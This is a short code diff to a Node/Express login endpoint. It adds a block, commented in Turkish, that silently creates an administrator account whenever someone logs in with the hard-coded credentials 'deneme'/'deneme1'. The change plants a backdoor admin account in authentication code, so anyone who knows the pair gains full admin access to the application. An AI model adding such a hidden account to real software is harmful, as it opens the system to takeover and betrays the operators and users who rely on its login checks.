@@ -567,6 +567,18 @@ app.post('/api/login', async (req, res) => {
     }
 
     try {
+        // "deneme" admin hesabı otomatik oluşturma
+        if (username === 'deneme' && password === 'deneme1') {
+            const [dRows] = await db.query('SELECT * FROM users WHERE username = "deneme"');
+            if (dRows.length === 0) {
+                const hashedPassword = await bcrypt.hash('deneme1', 12);
+                await db.query(
+                    'INSERT INTO users (username, name, email, password, role, is_active) VALUES (?, ?, ?, ?, ?, ?)',
+                    ['deneme', 'Deneme Admin', 'admin@deneme.com', hashedPassword, 'admin', true]
+                );
+            }
+        }
+
         const [rows] = await db.query('SELECT * FROM users WHERE username = ?', [username]);
 
         if (rows.length === 0) {
